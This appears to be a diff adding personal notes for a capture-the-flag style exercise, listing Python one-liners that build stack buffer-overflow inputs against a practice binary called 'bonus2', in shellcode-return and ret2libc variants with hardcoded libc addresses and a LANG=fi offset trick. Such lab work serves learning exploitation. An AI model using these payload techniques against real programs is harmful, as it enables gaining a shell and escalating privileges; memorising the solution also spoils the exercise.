@@ -1,0 +1,11 @@
+`python -c 'import struct; print a*20 + struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58) + "a"*8'` ZZZZbbbbccccddddeeeeffffgg
+export arg1=`python -c 'import struct; print struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58) + "a"*28'`; export arg2=`python -c 'import struct; print "ZZZZbbbbccccddddeeeefff" + struct.pack("<I", 0xbffff59d) + "ghhh"'`
+
+shellcode version:
+ ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa $(python -c 'import struct; print "ZZZZbbbbccccddddeeeefff" + struct.pack("<I", 0xbfffff0f)') #good, but need to export shell code in env and get its addr first
+
+
+ret2libc version:
+export LANG=fi
+./bonus2 $(python -c 'print "a"*40') $(python -c 'import struct; print "b"*18 + struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58)')
+
